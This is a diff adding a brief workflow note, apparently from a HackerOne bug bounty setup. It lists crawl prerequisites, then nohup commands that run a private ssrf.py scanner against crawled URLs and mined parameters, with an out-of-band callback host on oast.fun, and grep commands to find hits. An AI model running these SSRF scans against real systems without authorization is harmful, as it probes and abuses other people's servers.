@@ -1,0 +1,16 @@
+optionally requires passive_crawling.txt
+optionally requires input containing dir.txt
+optionally requires active_crawling_and_spidering.txt
+optionally requires param_miner.txt
+
+at least one of the above applications is required
+
+nohup python3.7 ~/scripts/ssrf.py -rl 100 -kd ./../../active_crawling_and_spidering -uf resolved_passively_crawled_urls_0_with_params.txt -H "X-Bug-Bounty: HackerOne-seudxs" &
+
+nohup python3.7 ~/scripts/ssrf.py -r req.txt -rl 100 -rsl ./../param_miner/param_miner_output.json -ho nhtlabzrlheflbtqwuhd6g4be3hx92qdk.oast.fun &
+nohup python3.7 ~/scripts/ssrf.py -r req.txt -te 5 -ts ./../seudxs_1_token_gen.py  -rl 100 -rsl ./../param_miner/param_miner_output_8.json -ho nhtlabzrlheflbtqwuhd6g4be3hx92qdk.oast.fun &
+nohup python3.7 ~/scripts/ssrf_new.py -r req.txt -te 5 -ts ./../seudxs_1_token_gen.py  -rl 10 -rsl ./../param_miner/param_miner_output_8.json -ho nhtlabzrlheflbtqwuhd6g4be3hx92qdk.oast.fun &
+
+grep -F -i -l -R  "reading" ./output
+grep -F -i -R -C 2 "reading" ./output
+
